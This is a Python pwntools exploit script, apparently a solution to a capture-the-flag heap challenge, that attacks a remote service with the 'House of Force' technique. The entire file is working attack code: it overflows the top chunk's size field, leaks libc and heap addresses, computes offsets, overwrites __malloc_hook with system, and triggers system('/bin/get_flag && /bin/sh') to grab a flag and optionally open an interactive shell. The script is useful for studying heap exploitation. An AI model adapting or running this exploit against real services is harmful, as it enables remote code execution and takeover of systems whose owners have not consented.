#!/usr/bin/python3

#import libraries
import sys
#get some pwn stuff into global namespace
from pwn import p64, sleep, remote, context, u64
#disable annoying pwntools log messages (e.g. info regarding opened/closed connection)
context.log_level = 'error'

#set host and port to connect to
host = "hacky3"
port = 13721
if len(sys.argv) >= 2:
    host = sys.argv[1]
if len(sys.argv) >= 3:
    port = int(sys.argv[2])


spawn_interactive_shell = False

manual_step_mode = False

flag_prev_in_use = 0x1


#This is where the exploit lives.
def exploit():
    proc = remote(host, port, fam="ipv4")

    if manual_step_mode: input()
    proc.write(b"y\n")
    proc.readuntil(b"Skywalker\x1b[0m!\n")

    print("This exploit uses a technique known as 'House of Force'.")
    print("See How2Heap Repo and the Malloc Maleficarum for reference.")
    

    #PRE LOOP
    huge_number = 0x7FFFFFFFFFFFF000
    print(f"(-) Overflowing into size field of top chunk with huge number ({huge_number:#0{0}18x}).")
    print("    This simulates more available space enabling larger allocations before malloc requests more memory.")
    if manual_step_mode: input()
    proc.write((0x108)*b"X" + p64(huge_number))
    proc.readuntil(b"try{}.\x1b[0m\n").decode()


    #ITER 1
    print("(-) Iter#01: Allocating and writing to chunk of size 0xa0.")
    if manual_step_mode: input()
    proc.write(b"r0x90\n")
    proc.write(b"1IRRELEVANTTXT" + b"\n")
    proc.readuntil(b"try{}.\x1b[0m\n").decode()


    #ITER 2
    print("(-) Iter#02: Allocating and writing to chunk of size 0x70.")
    if manual_step_mode: input()
    proc.write(b"r0x60\n")
    proc.write(b"2IRRELEVANTTXT" + b"\n")
    proc.readuntil(b"try{}.\x1b[0m\n").decode()


    #ITER 3
    print("(-) Iter#03: Allocating and writing to chunk of size 0x70.")
    if manual_step_mode: input()
    proc.write(b"r0x60\n")
    proc.write(b"3IRRELEVANTTXT" + b"\n")
    proc.readuntil(b"try{}.\x1b[0m\n").decode()


    #ITER 4
    print("(-) Iter#04: Allocating and writing to chunk of size 0x100 (barrier to wilderness).")
    if manual_step_mode: input()
    proc.write(b"r0xF0\n")
    proc.write(b"4IRRELEVANTTXT" + b"\n")
    proc.readuntil(b"try{}.\x1b[0m\n").decode()


    #ITER 5
    print("(-) Iter#05: Freeing chunk of size 0xa0 from iteration 01 to insert it into unsorted bin.")
    if manual_step_mode: input()
    proc.write(b"f1\n")
    proc.readuntil(b"try{}.\x1b[0m\n").decode()


    #ITER 6
    print("(-) Iter#06: Freeing chunk of size 0x70 from iteration 02 to insert it into fastbin 0x70.")
    if manual_step_mode: input()
    proc.write(b"f2\n")
    proc.readuntil(b"try{}.\x1b[0m\n").decode()


    #ITER 7
    print("(-) Iter#07: Freeing chunk of size 0x70 from iteration 03 to insert it into fastbin 0x70.")
    if manual_step_mode: input()
    proc.write(b"f3\n")
    proc.readuntil(b"try{}.\x1b[0m\n").decode()


    #ITER 8
    print("(-) Iter#08:")
    print("    Allocate chunk of size 0xa0 into freed chunk from unsorted bin.")
    print("    Print libc address pointing to unsorted bin in main arena.")
    print("    The address is left there since memory is not written on allocation.")
    if manual_step_mode: input()
    proc.write(b"w0x90\n")
    addr_libc_leak = int.from_bytes(proc.readuntil(b"try{}.\x1b[0m\n")[0:8], 'little')
    print(f"(-) leaked address from libc: {addr_libc_leak:#0{0}18x}")


    #ITER 9
    print("(-) Iter#09:")
    print("    Allocate chunk of size 0x70 into topmost freed chunk from fastbin 0x60.")
    print("    Print heap address pointing to second chunk in fastbin.")
    print("    The address is left there since memory is not written on allocation.")
    if manual_step_mode: input()
    proc.write(b"w0x60\n")
    addr_heap_leak = int.from_bytes(proc.readuntil(b"try{}.\x1b[0m\n")[0:8], 'little')
    print(f"(-) leaked address from heap: {addr_heap_leak:#0{0}18x}")


    #CALCULATE STUFF!
    print("(-) Calculating addresses using leaks and constant offsets:")
    if manual_step_mode: input()
    addr_libc_base = addr_libc_leak - 0x399B58
    addr_libc_system = addr_libc_base + 0x3f480
    addr_libc_mainarena_mallochook = addr_libc_leak - 0x68
    addr_heap_topchunk_header = addr_heap_leak + 0x1F0
    #addr_vuln_got_free = 0x600dd8
    #offset_topchunk_to_got_free = addr_vuln_got_free - addr_heap_topchunk_header - 4*8
    offset_topchunk_to_libc_mallochook = addr_libc_mainarena_mallochook - addr_heap_topchunk_header - 0x10
    print(f"    -> topchunk of heap is at                   {addr_heap_topchunk_header:#0{0}18x}")
    #print(f"    -> free@got.plt is at                       {addr_vuln_got_free:#0{0}18x}")
    #print(f"    -> offset free@got.plt - topchunk is       {offset_topchunk_to_got_free:#0{0}19x}")
    print(f"    -> libc base address is                     {addr_libc_base:#0{0}18x}")
    print(f"    -> __malloc_hook@libc is at                 {addr_libc_mainarena_mallochook:#0{0}18x}")
    print(f"    -> offset __malloc_hook@libc - topchunk is  {offset_topchunk_to_libc_mallochook:#0{0}18x}")
    print(f"    -> system@libc is at                        {addr_libc_system:#0{0}18x}")


    #ITER 10
    print(f"(-) Allocating chunk of size {offset_topchunk_to_libc_mallochook:#0{0}18x}.")
    print( "    This leaves the topchunk (beginning of wilderness) directly before __malloc_hook@libc.") 
    proc.write(b"r" + hex(offset_topchunk_to_libc_mallochook).encode() + b"\n")
    if manual_step_mode: input()
    proc.write(b"10IRRELEVANTTXT" + b"\n")
    proc.readuntil(b"try{}.\x1b[0m\n").decode()


    #ITER 11
    print(f"(-) Allocating chunk to write address of system ({addr_libc_system:#0{0}18x} to mallochook.")
    print( "    Also writing string b'/bin/get_flag && /bin/sh\x00' to adjacent memory.") 
    if manual_step_mode: input()
    proc.write(b"r0x90\n")
    proc.write(p64(addr_libc_system) + b"/bin/get_flag && /bin/sh\x00" + b"\n")
    proc.readuntil(b"try{}.\x1b[0m\n").decode()


    #ITER 12
    print("(-) Calling malloc on string at {addr_libc_mainarena_mallochook + 0x8:#0{0}18x} to trigger mallochook:")
    print("    -> calls system(\"/bin/get_flag && /bin/sh\")") 
    if manual_step_mode: input()
    proc.write(b"r" + hex(addr_libc_mainarena_mallochook + 0x8).encode() + b"\n")

    flag = proc.readuntil(b"flag", timeout=0.5)
    for i in range(0,10):
        if b'flag' in flag:
            break
        else:
            print("(-) Waiting for flag...")
            flag = proc.readuntil(b"flag", timeout=0.5)

    if b'flag' in flag:
        flag = b'flag' + proc.readline(timeout=5)

    if b'_' in flag:
        print(f"(-) Successfully retrieved flag: {flag.decode()}")
        if spawn_interactive_shell:
            proc.interactive()
        else:
            proc.write(b"exit\n")
    else:
        print("(-) Something went wrong retrieving the flag...")

    proc.close()
    return


#Invoke the exploit when the script is executed.
exploit()


